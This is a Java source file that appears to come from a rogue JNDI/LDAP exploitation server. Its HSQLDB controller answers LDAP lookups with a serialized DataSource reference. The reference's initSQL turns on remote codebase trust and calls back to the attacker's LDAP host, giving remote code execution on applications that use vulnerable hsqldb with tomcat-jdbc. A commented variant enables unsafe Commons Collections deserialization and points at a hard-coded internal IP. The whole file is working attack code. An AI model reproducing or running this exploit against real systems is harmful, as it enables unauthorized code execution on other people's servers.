package artsploit.controllers;

import artsploit.Config;
import artsploit.annotations.LdapMapping;
import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
import com.unboundid.ldap.sdk.Entry;
import com.unboundid.ldap.sdk.LDAPResult;
import com.unboundid.ldap.sdk.ResultCode;

import javax.naming.Reference;
import javax.naming.StringRefAddr;

import static artsploit.Utilities.serialize;

/**
 * Yields:
 *  RCE via INIT script for HSQL database when connection is made by tomcat-jdbc pooling library.
 *
 * @see <a href="https://mogwailabs.de/en/blog/2023/04/look-mama-no-templatesimpl/">exploitation details</a>

 * Requires:
 * - hsqldb < 2.6.2
 * - tomcat-jdbc
 * @author GEBIRGE
 */
@LdapMapping(uri = { "/o=hsqldb" })
public class HSQLDB implements LdapController {
    public void sendResult(InMemoryInterceptedSearchResult result, String base) throws Exception {
        if (Config.jdbcURL.isEmpty()) throw new Exception("--jdbc-url must be set");

        System.out.println("Sending LDAP ResourceRef result for " + base);

        // For HikariCP:
        // var reference = new Reference("javax.sql.DataSource", "com.zaxxer.hikari.HikariJNDIFactory", null);
        // reference.add(new StringRefAddr("connectionInitSql", ""));

        var payloadURL = "ldap://" + Config.hostname + ":" + Config.ldapPort + "/o=reference";

        var reference = new Reference("javax.sql.DataSource", "org.apache.tomcat.jdbc.pool.DataSourceFactory", null);
        reference.add(new StringRefAddr("driverClassName", "org.hsqldb.jdbc.JDBCDriver"));
        reference.add(new StringRefAddr("url", Config.jdbcURL));
        reference.add(new StringRefAddr("initSQL", "CALL \"java.lang.System.setProperty\"('com.sun.jndi.ldap.object.trustURLCodebase', 'true');" +
                "CALL \"javax.naming.InitialContext.doLookup\"('"+ payloadURL + "');"));

        // This could also be used, if CommonsCollections is in the classpath of the application in question.
        // reference.add(new StringRefAddr("initSQL", "CALL \"java.lang.System.setProperty\"('org.apache.commons.collections.enableUnsafeSerialization', 'true');CALL \"javax.naming.InitialContext.doLookup\"('ldap://192.168.0.166:1389/o=generic');"));

        var e = new Entry(base);
        e.addAttribute("javaClassName", "java.lang.String");
        e.addAttribute("javaSerializedData", serialize(reference));

        result.sendSearchEntry(e);
        result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
    }
}